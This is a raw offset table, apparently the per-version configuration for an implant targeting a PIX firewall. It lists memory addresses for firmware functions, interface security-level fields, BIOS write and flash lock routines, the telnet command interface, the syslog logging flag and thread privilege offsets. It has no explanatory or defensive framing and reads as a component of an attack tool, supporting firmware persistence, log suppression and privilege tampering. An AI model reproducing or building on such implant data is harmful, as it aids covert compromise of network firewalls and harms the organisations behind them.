; --- SECTION I ---
;
0x63f            // pix version
0x1fb000              // address of implant configuration
0x0   0x00100db8      // allocb
0x1   0x00100f94      // freeb
0x2   0x0010160c      // open
0x3   0x001f0628      // put
0x4   0x001016a0      // close
0x5   0x004e4468      // atoip
0x6   0x004d5ca8      // memset
0x7   0x004d9d78      // memcpy
0x8   0x004d7a30      // malloc
0x9   0x004d814c      // free
0xa   0x00102258      // printf
0xb   0x004c6910      // des_encrypt
0xc   0x004e2520      // isprint
0xd   0x004c73f0      // des_set_key
0xe   0x0023d01c      // sha (pre-631)/sha1
0xf   0x003fa6cc      // rand
0x15  0x001037f0      // process_create
0x16  0x001044e0      // process_suspend
0x17  0x0010460c      // process_sleep_for
0x18  0x004b8308      // show_process
0x19  0x00104e14      // bark
0x1a  0x00569c4c      // cur_t
0x2a  0x38            // rptr structure offset
0x2b  0x40            // wptr structure offset
0x2c  0x10            // inIfc (incoming interface) structure offset
0x2d  0x4c            // iftype (interface type) structure offset (deprecated?)
0x30  0x0057c09c      // address of interface 0 security level
0x31  0x0057c0a0      // address of interface 0 name
0x32  0x0057c07c      // address of interface 0 IP
0x33  0x2d8           // length of interface struct
0x34  0x005e7148      // max number of interface cards
0x35  0x005e7150      // internal_clock
0x36  0x005718c0      // addr of flash structure
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
InterfaceAddr       0x0057c07c      // matches entry 0x32 above
InterfaceLeng       0x1c70          // 10 times entry 0x33 above
IntSecurityOffset   0x20            // security level field offset
IntNameOffset       0x24            // interface name field offset
FlashClassAddr      0x005718c0      // addr of flash structure
CryptoDeviceAddr    0x00532d20      // addr of crypto structure
ArpTableAddrPtr     0x0051bc94      // addr of first entry in ARP table
ArpTableLastPtr     0x0051bc9c      // addr of last entry in ARP table
NumInterfaces       0x0057bb68      // addr of pointer to number of interfaces
IfaceStruct2        0x00577760      // addr of pointer to second smaller interface struct
IfaceStruct2Len     0xa8            // length of 2nd smaller interface struct used by arp cache
BiosClassAddr       0x00571888      // addr of the bios class structure
BiosWriteAddr1      0x001aaebc      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x001af96c      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x001b008c      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x001b1d70      // addr of the bios write function for one specific bios
BiosWriteAddr5      0x001b25c4      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
BiosReadE28F6       0x001b2250      // addr of the bios read function for e28f640j3 chip
BiosLockE28F6       0x001b27d0      // addr of the bios block lock/unlock function for e28f640j3 chip
AnnounceFunc        0x001015bc      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
CIStartFunc         0x00107b90      // addr of the command interface start function -- telnet function
CommandListAddr     0x0051df8c      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x00532ba8      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x004e1628      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x00527c3c      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00001      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00002      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0x54            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0x58            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0x5c            // offset into a thread struct containing the pointer to the environment struct  
Open                0x0010160c      // channel open
WatchDogTimeout     0x0050b40c      // Address where the thread timeout value is stored 
UpTimeCounter       0x00569410      // Address of the up time counter
;
; --- END OF SECTION II ---
;
:EOS:
;
